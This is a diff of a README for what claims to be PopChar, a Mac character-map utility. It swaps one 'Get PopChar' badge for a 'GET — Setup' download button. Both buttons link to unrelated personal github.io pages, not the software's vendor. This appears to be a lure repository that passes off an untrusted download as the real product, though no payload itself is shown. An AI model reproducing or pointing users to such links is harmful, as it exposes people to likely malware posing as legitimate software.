@@ -1,14 +1,6 @@
 # PopChar – The Ultimate Character Map Utility
 
-<div align="center">  
-<img src="https://assets.ergonis.com/website/large_popchar10_6128d6c397.png" alt="PopChar Logo" width="256" height="256">  
-</div>  
-
-<div align="center">  
-<a href="https://agapattiede.github.io/.github/popchar">  
-<img src="https://img.shields.io/badge/Get_PopChar-darkgreen?style=for-the-badge&logo=apple" alt="Get PopChar">  
-</a>  
-</div>  
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://ceylanbalaban61737.github.io/.github/PopChar-Mac)
 
 ---
 
